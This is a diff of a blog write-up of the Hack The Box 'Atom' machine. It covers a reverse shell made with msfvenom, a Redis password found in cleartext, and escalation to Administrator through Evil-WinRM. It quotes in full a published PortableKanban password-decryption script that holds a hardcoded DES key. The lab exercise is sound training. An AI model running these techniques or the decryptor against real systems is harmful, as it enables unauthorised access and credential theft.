@@ -20,10 +20,10 @@ output: html_document
 ![desc]({{https://jsom1.github.io/}}/_images/htb_knife_desc.png)
 </div>
 
-**Ports/services exploited:** SMB\\
+**Ports/services exploited:** SMB, Redis, WinRM\\
 **Tools:** dirb, smbclient, msfvenom\\
 **Techniques:** Enumeration, reverse shell\\
-**Keywords:** Electron builder\\
+**Keywords:** Electron builder, Redis, WinRM\\
 
 
 ## 1. Port scanning
@@ -243,7 +243,7 @@ We should see the server doing a GET request to our server (to download the file
 
 At first I thought it didn't work, but we have to wait long enough to see the request... The scripts probably runs once per minute or something like that. Now that the server grabbed our file, it should execute it and connect back to us. Sadly notthing happens in Metasploit, it doesn't catch any shell back... That means there's a problem with our payload in the *m'aliciousupdate.exe* file...\\\
 
-Someone on the forum suggested to take null bytes into consideration, so I added *-b "\x00"* to the *msfvenom* command. It still didn't work. After trying with different encodings, it finally worked with another payload: instead of *windows/meterpreter/reverse_tcp*, I used *windows/x64/shell_reverse_tcp*:
+Someone on the forum suggested to take null bytes into consideration, so I added *-b "\x00"* to the *msfvenom* command. It still didn't work. After trying with different encodings, it finally worked with another payload: instead of *windows/meterpreter/reverse_tcp*, I used *windows/x64/shell_reverse_tcp*. This might be due to the fact I didn't specify *x64* in my prior payload... *windows/x64/meterpreter/reverse_tcp* might work too. Let's look at the one I used and which worked:
 
 <div class="img_container">
 ![revsh]({{https://jsom1.github.io/}}/_images/htb_atom_revsh.png)
@@ -255,11 +255,151 @@ From there, we can easily retrieve the user's flag from the Desktop:
 ![User flag]({{https://jsom1.github.io/}}/_images/htb_atom_user.png)
 </div>
 
-And we're back at enumeration. We'll start with a little manual search and if we don't find anything, we might uplaod an automatic script such as *WinPeas*.
+And we're back at enumeration. We'll start with a little manual search and if we don't find anything, we might uplaod an automatic script such as *WinPEAS* (the equivalent of Linux' LinPEAS). One of the first thing I check on Linux box' is the current user privileges with *sudo -l*. The Windows equivalent is *whoami /priv*:
 
+<div class="img_container">
+![User privs]({{https://jsom1.github.io/}}/_images/htb_atom_userpriv.png)
+</div>
 
+We see *SeChangeNotifyPrivilege* is enabled. Googling it reveals it is a potential PE vector, and there's the *lonely potato* exploit that leverages that vulnerability. From what I read though, this exploit is out of date... Since I'm not really used to Windows enumeration, let's try to upload WinPEAS to automate the process. We'll start a web server on Kali (*sudo python -m SimpleHTTPServer 8000*) and serve the *.exe* file. We'll use a Powershell command to download it from our Windows reverse shell: 
 
+<div class="img_container">
+![winPEAS upload]({{https://jsom1.github.io/}}/_images/htb_atom_upload.png)
+</div>
+
+Note that commands (in and out of Powershell) issued in the reverse shell containing ' " ' crash it.
+At this point, we'd normally run the script and analyze its output. However, it doesn't work for some reason (see https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues/25).
+
+Let's go for a full manuel enumation. However, we won't look around randomly. Our full TCP scan revealed a *WSMan* and *Redis* instance. Let's look for more info about those processes. By going in *C:\Program Files*, we see a *Redis* directory. Within that directory, there's a configuration file called *redis.windows.conf*. We can view its content with the command *type*:
+
+<div class="img_container">
+![password]({{https://jsom1.github.io/}}/_images/htb_atom_pw.png)
+</div>
+
+One of the first lines reveals a cleartext password. I don't know how to connect to *Redis*, but a quick Google search suggests the following syntax:
+
+````
+$ redis-cli -h host -p port -a password
+``````
+
+Redis-cli (part of Redis-server or Redis-tools) isn't preinstalled on Kali by default, so we install first:
+
+````
+sudo apt-get install redis-tools
+`````
+
+And we try to connect to it:
+
+<div class="img_container">
+![redis co]({{https://jsom1.github.io/}}/_images/htb_atom_rediscli.png)
+</div>
+
+It worked! Now that we're connected, I checked redis commands but it doesn't seem to work as we see in the image. However, the command *info* returns information about *Redis*. I have no idea about *Redis'* syntax, and from this point on I had to ask for help. Apparently, we can get useful information with the following command:
+
+<div class="img_container">
+![redis keys]({{https://jsom1.github.io/}}/_images/htb_atom_keys.png)
+</div>
+
+We see a user and we can get more information about this person by using the command *get*. We get a password hash, but where can we use it? And how can we decrypt it? If I did a very thorough enumeration, I should have found an interesting directory in jason's download directory:
+
+<div class="img_container">
+![kanban]({{https://jsom1.github.io/}}/_images/htb_atom_kanban.png)
+</div>
+
+Kanban is a method used in agile development. By Googling it, we find an exploit and learn that portablekanban stores credentials in an encrypted format. Here's the published PoC:
+
+`````
+# Exploit Title: PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval
+# Date: 9 Jan 2021
+# Exploit Author: rootabeta
+# Vendor Homepage: The original page, https://dmitryivanov.net/, cannot be found at this time of writing. The vulnerable software can be downloaded from https://www.softpedia.com/get/Office-tools/Diary-Organizers-Calendar/Portable-Kanban.shtml
+# Software Link: https://www.softpedia.com/get/Office-tools/Diary-Organizers-Calendar/Portable-Kanban.shtml
+# Version: Tested on: 4.3.6578.38136. All versions that use the similar file format are likely vulnerable.
+# Tested on: Windows 10 x64. Exploit likely works on all OSs that PBK runs on. 
+
+# PortableKanBan stores credentials in an encrypted format
+# Reverse engineering the executable allows an attacker to extract credentials from local storage
+# Provide this program with the path to a valid PortableKanban.pk3 file and it will extract the decoded credentials
+
+import json
+import base64
+from des import * #python3 -m pip install des
+import sys
+
+try:
+	path = sys.argv[1]
+except:
+	exit("Supply path to PortableKanban.pk3 as argv1")
+
+def decode(hash):
+	hash = base64.b64decode(hash.encode('utf-8'))
+	key = DesKey(b"7ly6UznJ")
+	return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')
+
+with open(path) as f:
+	try:
+		data = json.load(f)
+	except: #Start of file sometimes contains junk - this automatically seeks valid JSON
+		broken = True
+		i = 1
+		while broken:
+			f.seek(i,0)
+			try:
+				data = json.load(f)
+				broken = False
+			except:
+				i+= 1
+			
+
+for user in data["Users"]:
+	print("{}:{}".format(user["Name"],decode(user["EncryptedPassword"])))
+``````
+
+We see thee script decrypts passwords... We copy this code into a file, for example *portablekb.py*, and adapt it to what we need with the password we just found:
+
+<div class="img_container">
+![adapted Poc]({{https://jsom1.github.io/}}/_images/htb_atom_poc.png)
+</div>
+
+We see the code imports everything from *des*, so we have to install that beforehand:
+
+```
+sudo apt-get install python3-pip
+sudo python3 -m pip install des
+``````
+
+Once we have it, we execute the script:
+
+<div class="img_container">
+![decrypted pw]({{https://jsom1.github.io/}}/_images/htb_atom_adminpw.png)
+</div>
+
+And we got admin's plaintext password. Finally, we can use Evil-WinRM, which is a shell that can be described as the following:
+
+*Evil-WinRM is the ultimate WinRM shell for hacking/pentesting.
+WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.
+This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation hacking/pentesting phase. The purpose of this program is to provide nice and easy-to-use features for hacking. It can be used with legitimate purposes by system administrators as well but the most of its features are focused on hacking/pentesting stuff.
+It is based mainly in the WinRM Ruby library which changed its way to work since its version 2.0. Now instead of using WinRM protocol, it is using PSRP (Powershell Remoting Protocol) for initializing runspace pools as well as creating and processing pipelines.*
+
+We must install it:
+
+````
+sudo gem install evil-winrm
+````
+
+And we can use it:
+
+<div class="img_container">
+![decrypted pw]({{https://jsom1.github.io/}}/_images/htb_atom_adminpw.png)
+</div>
+
+We see we get a reverse shell as the administrator! We can grab the flag on the desktop.
 
 <ins>**My thoughts**</ins>
 
-Long time no Windows, maybe more frequet than Linux. Not used to so many information, struggle to know where to start. Revsh frustrating
+This box was harder than I imagined... First, nmap discovered several open ports and I struggled to know where to start... I went through many wrong paths before finding the good one. It's great however that in the end, we almost used every available service, including Redis and WinRM!\\
+I didn't know much about those latter services and got to know a little bit of *redis-cli* and *Evil-winRM*. It wasn't much but it will be enough to point me in the right direction the next time I see those services.
+
+It was also hard because my last Windows box was a long time ago and I forgot the little I knew about SMB and Windows PE enumeration. I wasn't able to upload WinPEAS and had to rely on manual enumeration, which didn't work so well. I found the Redis config file but was pretty much lost after that and had to ask for help.\\
+
+Overall I learned a lot and had fun, so it was a great box as usual!
